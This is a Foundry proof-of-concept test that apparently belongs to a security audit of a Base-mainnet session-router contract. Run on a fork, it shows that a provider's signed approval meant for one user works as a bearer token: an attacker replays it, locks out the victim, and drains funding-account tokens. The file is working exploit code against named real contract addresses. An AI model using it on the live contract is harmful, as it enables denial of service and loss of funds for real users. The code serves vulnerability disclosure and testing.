// SPDX-License-Identifier: MIT
// PoC B — C1 (T4): provider approval is a bearer token (SessionRouter).
// Forks Base mainnet at a pinned block. Attacker is unprivileged; the provider
// key is fresh and PoC-controlled, and signs an approval for the VICTIM only.
// Nothing here touches mainnet state; all calls run on the fork.
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Lite {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDiamondLite {
    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }
    function providerRegister(address, uint256, string calldata) external;
    function modelRegister(address, bytes32, bytes32, uint256, uint256, string calldata, string[] calldata)
        external;
    function postModelBid(address, bytes32, uint256) external returns (bytes32);
    function getModelId(address, bytes32) external pure returns (bytes32);
    function openSession(address, uint256, bool, bytes calldata, bytes calldata) external returns (bytes32);
    function closeSession(bytes calldata, bytes calldata) external;
    function claimForProvider(bytes32) external;
    function getIsProviderApprovalUsed(bytes memory) external view returns (bool);
    function getComputeBalance(uint128) external view returns (uint256);
    function totalMORSupply(uint128) external view returns (uint256);
    function stakeToStipend(uint256, uint128) external view returns (uint256);
    function getSessionEnd(uint256, uint256, uint128) external view returns (uint128);
    function getUserStakesOnHold(address, uint8) external view returns (uint256, uint256);
    function withdrawUserStakes(address, uint8) external;
    function getUserSessions(address, uint256, uint256) external view returns (bytes32[] memory, uint256);
    function startOfTheDay(uint128) external pure returns (uint128);
    function getBidFee() external view returns (uint256);
    function getSession(bytes32) external view returns (Session memory);
}

contract PocB is Test {
    string constant BASE_RPC = "https://mainnet.base.org";
    uint256 constant BLOCK = 58513216;

    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;

    uint256 constant PROVIDER_PK = 0xBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEF;
    uint256 constant STAKE_MOR = 10000 ether;
    uint256 constant PRICE_PER_SECOND = 1e12;

    error SessionDuplicateApproval();

    IDiamondLite diamond;
    IERC20Lite mor;
    address provider;
    address victim;
    address attacker;
    bytes32 bidId;
    bytes32 sessionId;
    bytes approval;
    uint128 endsAt;
    uint256 fundingBefore;
    uint256 expectedPay;

    function _ethSigned(bytes memory encoded) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(encoded)));
    }

    function _sign(uint256 pk, bytes memory encoded) internal returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, _ethSigned(encoded));
        return abi.encodePacked(r, s, v);
    }

    function _forkAndFund() internal {
        vm.createSelectFork(BASE_RPC, BLOCK);
        diamond = IDiamondLite(DIAMOND);
        mor = IERC20Lite(MOR);
        provider = vm.addr(PROVIDER_PK);
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        vm.deal(provider, 10 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);
        deal(MOR, provider, 2 ether);
        deal(MOR, attacker, STAKE_MOR);
        deal(MOR, victim, STAKE_MOR);
        fundingBefore = mor.balanceOf(FUNDING);
        console.log("=== PoC B - block", BLOCK);
        console.log("block.timestamp:", block.timestamp);
        console.log("getComputeBalance MOR:", diamond.getComputeBalance(uint128(block.timestamp)));
        console.log("totalMORSupply MOR:", diamond.totalMORSupply(uint128(block.timestamp)));
        console.log("stipend for 10000 MOR:", diamond.stakeToStipend(STAKE_MOR, uint128(block.timestamp)));
        console.log("bidFee MOR:", diamond.getBidFee());
        console.log("fundingAccount MOR before:", fundingBefore);
    }

    function _registerAndBid() internal {
        vm.startPrank(provider);
        mor.approve(DIAMOND, 2 ether);
        diamond.providerRegister(provider, 1 ether, "https://example.invalid");
        diamond.modelRegister(provider, bytes32(uint256(1)), bytes32(uint256(1)), 0, 0.1 ether, "t", new string[](0));
        bytes32 modelId = diamond.getModelId(provider, bytes32(uint256(1)));
        bidId = diamond.postModelBid(provider, modelId, PRICE_PER_SECOND);
        vm.stopPrank();
        assertEq(mor.balanceOf(provider), 0.6 ether, "provider setup spend != 1.4 MOR");
    }

    function _openAsAttacker() internal {
        // Provider signs an approval FOR THE VICTIM ONLY.
        // Format (provider-helper.ts): abi.encode(bidId, chainId, user, timestamp),
        // eth-signed message over keccak256 of that encoding.
        approval = abi.encode(bidId, uint256(8453), victim, uint128(block.timestamp));
        bytes memory sig = _sign(PROVIDER_PK, approval);
        vm.startPrank(attacker);
        mor.approve(DIAMOND, STAKE_MOR);
        sessionId = diamond.openSession(attacker, STAKE_MOR, false, approval, sig);
        vm.stopPrank();
        assertTrue(diamond.getIsProviderApprovalUsed(approval), "approval not marked used");
        IDiamondLite.Session memory s = diamond.getSession(sessionId);
        assertEq(s.user, attacker, "session user is not the attacker");
        endsAt = s.endsAt;
        expectedPay = 604800 * PRICE_PER_SECOND; // 0.6048 MOR
        console.log("sessionId opened by attacker; endsAt:", endsAt);
        assertEq(endsAt, uint128(block.timestamp) + 604800 - 0, "duration not capped at 7 days");
    }

    function _victimReverts() internal {
        // Victim is funded + approved so the revert comes from the duplicate
        // check, not from the token pull that precedes validation.
        vm.startPrank(victim);
        mor.approve(DIAMOND, STAKE_MOR);
        vm.expectRevert(SessionDuplicateApproval.selector);
        diamond.openSession(victim, STAKE_MOR, false, approval, _sign(PROVIDER_PK, approval));
        vm.stopPrank();
        (, uint256 victimSessionCount) = diamond.getUserSessions(victim, 0, 10);
        assertEq(victimSessionCount, 0, "victim somehow has a session");
    }

    function _closeAndSettle() internal {
        vm.warp(endsAt + 1);
        bytes memory receipt =
            abi.encode(sessionId, uint256(8453), uint128(block.timestamp), uint32(1000000), uint32(100));
        bytes memory receiptSig = _sign(PROVIDER_PK, receipt);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);
        (uint256 avail, uint256 hold) = diamond.getUserStakesOnHold(attacker, 255);
        console.log("attacker MOR right after close:", mor.balanceOf(attacker));
        console.log("on-hold available:", avail, "hold:", hold);
        // Withdraw the day-locked remainder, then the attacker must be whole.
        uint128 releaseAt = diamond.startOfTheDay(endsAt) + 1 days;
        vm.warp(releaseAt + 1);
        vm.prank(attacker);
        diamond.withdrawUserStakes(attacker, 255);
        console.log("attacker MOR after withdrawUserStakes:", mor.balanceOf(attacker));
        assertEq(mor.balanceOf(attacker), STAKE_MOR, "attacker stake not fully refunded");
    }

    function testBearerApproval() public {
        _forkAndFund();
        _registerAndBid();
        uint128 openedAt = uint128(block.timestamp);
        _openAsAttacker();
        assertEq(endsAt, openedAt + 604800, "duration not capped at 7 days");
        _victimReverts();
        _closeAndSettle();
        uint256 providerAfter = mor.balanceOf(provider);
        uint256 fundingAfter = mor.balanceOf(FUNDING);
        console.log("provider MOR after:", providerAfter);
        console.log("fundingAccount MOR after:", fundingAfter);
        console.log("expected provider pay MOR:", expectedPay);
        assertEq(providerAfter, 0.6 ether + expectedPay, "provider gain != 0.6048 MOR");
        assertEq(fundingBefore - fundingAfter, expectedPay, "fundingAccount loss != 0.6048 MOR");
        // Provider has nothing left to claim (already paid at close).
        vm.prank(provider);
        diamond.claimForProvider(sessionId);
        assertEq(mor.balanceOf(provider), 0.6 ether + expectedPay, "claimForProvider paid extra");
    }
}
